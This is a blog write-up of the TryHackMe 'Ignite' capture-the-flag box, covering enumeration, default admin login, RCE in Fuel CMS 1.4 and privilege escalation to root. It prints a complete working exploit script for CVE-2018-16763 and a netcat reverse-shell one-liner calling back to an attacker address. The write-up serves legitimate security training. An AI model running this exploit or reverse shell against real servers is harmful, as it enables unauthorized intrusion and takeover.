---
title: Walkthrough - Tryhackme Box (Ignite)
date: 2025-07-21 15:14:34 +0100
categories: [Cyber security, CTF Walkthroughs]
tags: [ctf]     # TAG names should always be lowercase
description: Writeup of the tryhackme Ignite box
comments: false
toc: true
---
This is a full writeup of the Ignite CTF challenge in tryhackme.

This is a walkthrough for the **Ignite** machine on TryHackMe. The machine features a web application vulnerable to remote code execution (RCE) through a Fuel CMS version.

### 1. Scanning the Target

I began by scanning the target machine with `nmap` to identify open ports and running services.

~~~shell
nmap -Pn -sV 10.10.116.74 -oA ignite
~~~

![Nmap Scan](/assets/img/posts/ctf/ignite/nmap.png)

The scan revealed that port **80** was open and running an **HTTP service**.

### 2. Exploring the Website

I opened a browser and navigated to the target’s IP address: http://10.10.116.74

![Home page](/assets/img/posts/ctf/ignite/website.png)

The homepage was simple and didn’t reveal much information directly.


### 3. Checking robots.txt

I checked the `robots.txt` file for any hidden directories at http://10.10.116.74/robots.txt, which contained the following directive:

~~~shell
Disallow: /fuel/
~~~

![open reverse shell](/assets/img/posts/ctf/ignite/robotstxt.png)

This hinted at a potential fuel-powered CMS backend admin interface.



### 4. Discovering the Login Page

Navigating to the hidden path: http://10.10.116.74/fuel led me to a **Fuel CMS login page**.

![CMS interface](/assets/img/posts/ctf/ignite/fuel.png)


I attempted several common default credentials.
|   | **username** | **password** |
|---|--------------|--------------|
| 1 | admin        | 1234         |
| 2 | admin        | password     |
| 3 | admin        | 1q2w3e4r!    |
| 4 | _admin_      | _admin_      |

The admin-admin combo was valid, which allowed access to the CMS interface.

![CMS interface](/assets/img/posts/ctf/ignite/admin.png)


### 5. Identifying the CMS Version

After logging in, I explored the CMS dashboard. I referenced the documentation and determined that the site was running **Fuel CMS version 1.4**.
This information was also available on the landing page of the website.


### 6. Searching for Exploits

I used `searchsploit` to look for vulnerabilities associated with Fuel CMS 1.4.

~~~shell
searchsploit fuel cms 1.4
~~~

![searchsploit](/assets/img/posts/ctf/ignite/searchsploit.png)

Several Remote Code Execution (RCE) scripts were listed. I decided to test a few of them.



### 7. Exploitation Attempts

The first exploit script(47138) I tried failed due to Python versioning issues (usage of python2), use of outdated libraries (usage of urllib.quote instead of urllib.parse.quote) and multiple misconfigurations. I attempted fixing the code, but decided to move onto other available RCE scripts.

Next, I attempted exploitation using a script for **CVE-2018-16763**(50477) downloaded via Exploit DB, which successfully provided remote code execution. This is the full python script:

~~~python
# Exploit Title: Fuel CMS 1.4.1 - Remote Code Execution (3)
# Exploit Author: Padsala Trushal
# Date: 2021-11-03
# Vendor Homepage: https://www.getfuelcms.com/
# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
# Version: <= 1.4.1
# Tested on: Ubuntu - Apache2 - php5
# CVE : CVE-2018-16763

#!/usr/bin/python3

import requests
from urllib.parse import quote
import argparse
import sys
from colorama import Fore, Style

def get_arguments():
	parser = argparse.ArgumentParser(description='fuel cms fuel CMS 1.4.1 - Remote Code Execution Exploit',usage=f'python3 {sys.argv[0]} -u <url>',epilog=f'EXAMPLE - python3 {sys.argv[0]} -u http://10.10.21.74')

	parser.add_argument('-v','--version',action='version',version='1.2',help='show the version of exploit')

	parser.add_argument('-u','--url',metavar='url',dest='url',help='Enter the url')

	args = parser.parse_args()

	if len(sys.argv) <=2:
		parser.print_usage()
		sys.exit()
	
	return args


args = get_arguments()
url = args.url 

if "http" not in url:
	sys.stderr.write("Enter vaild url")
	sys.exit()

try:
   r = requests.get(url)
   if r.status_code == 200:
       print(Style.BRIGHT+Fore.GREEN+"[+]Connecting..."+Style.RESET_ALL)


except requests.ConnectionError:
    print(Style.BRIGHT+Fore.RED+"Can't connect to url"+Style.RESET_ALL)
    sys.exit()

while True:
	cmd = input(Style.BRIGHT+Fore.YELLOW+"Enter Command $"+Style.RESET_ALL)
		
	main_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+quote(cmd)+"%27%29%2b%27"

	r = requests.get(main_url)

	#<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">

	output = r.text.split('<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">')
	print(output[0])
	if cmd == "exit":
		break
~~~

---
#### Script Explanation

**Imports**
  - requests: HTTP requests to the target
  - urllib.parse.quote: URL-encodes individual command string inputs to safely inject into the vulnerable query string.
  - argparse: command line parsing
  - sys: allows interaction with Python interpreter and runtime environment. Essential when the script includes CLI arguments, fetches interpreter version, redirects I/O streams, and requires graceful exits.
  - colorama: for a coloured terminal output

**get_arguments Function**
Checks if the user input is valid, with a url value and argument length less than 3, then parses and returns the input as an args object. Ensures the user is providing the target URL using the _-u_ flag.

**Lines 37 to 39**
Performs a basic check if the args, parsed as a URL, is a valid URL (if it includes the string 'http'). This is a very simple and naive check.

**Lines 41 to 49**
sends a simple get request to the designated URL to verify connectivity, exits the program if the server doesn't return a success code (200).

**While Loop (Lines 51–63)**
The script enters an loop that repeatedly prompts the user for shell commands. Each command is injected into a vulnerable endpoint _(`/fuel/pages/select/?filter=`)_ which is vulnerable to PHP code injection **(CVE-2018-16763)**. The command is URL-encoded and included in the request.

*Note: While the loop is persistent, the connection is not. Each command is sent as an independent HTTP GET request. The vulnerable page executes the command using PHP's `system()` function and returns the output inside an HTML response.*

The response is parsed and printed, and the loop continues until the user types `exit`.

---

Executing this script allowed me to perform RCE on the target machine.

![open reverse shell](/assets/img/posts/ctf/ignite/initialrce.png)
<!--Typo (Initialrce with capital I) fixed-->


### 8. Preparing the Listener

To capture a reverse shell, I opened a new `tmux` window and started a listener using `rlwrap` and `netcat` on port 53:
~~~shell
rlwrap nc -lvnp 53
~~~



### 9. Triggering the Reverse Shell

Using the RCE vulnerability, I injected a reverse shell command pointing back to my machine. The reverse shell command was generated using *[revshells](https://www.revshells.com/)*

~~~shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.182.102 53 >/tmp/f
~~~

![open reverse shell](/assets/img/posts/ctf/ignite/sendreverse.png)

You can now see that the netcat listener open on port 53 was able to catch and access the reverse shell:

![open reverse shell](/assets/img/posts/ctf/ignite/listenreverse.png)

### 10. Getting the User flag

Inside the compromised shell, I navigated the file system and located the flag.txt file in the user’s home directory.
~~~shell
cat /home/<user>/flag.txt
~~~

![user flag](/assets/img/posts/ctf/ignite/userflag.png)

### 11. Finding Credentials for Privillege Escalation
Looking for sensitive files, I found the following file containing database configuration:
~~~shell
fuel/application/config/database.php
~~~
Inside it, I found plaintext credentials for the root user.

![open reverse shell](/assets/img/posts/ctf/ignite/database.png)

### 12. Privilege Escalation to Root
I attempted to switch to root using the su command:
~~~shell
su -
~~~
but was met with the following error:
~~~shell
su: must be run from a terminal
~~~

![open reverse shell](/assets/img/posts/ctf/ignite/escalation.png)

To fix this, I upgraded the shell to a fully interactive TTY by running the following command I found at this *[blog post](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)*.
~~~shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
~~~

Using the password I obtained earlier from database.php, I was able to root the server and gain access to the root flag (root.txt)

![open reverse shell](/assets/img/posts/ctf/ignite/rootflag.png)

## Summary
- Enumerated open HTTP port and checked robots.txt
- Discovered Fuel CMS admin panel with default credentials
- Found version 1.4 and exploited CVE-2018-16763
- Gained RCE and reverse shell using Netcat
- Retrieved user and root flags via credential reuse and privilege escalation

#### Tools and Concepts Used
- nmap
- robots.txt
- Fuel CMS Interface
- searchsploit
- Python
- tmux
- rlwrap
- netcat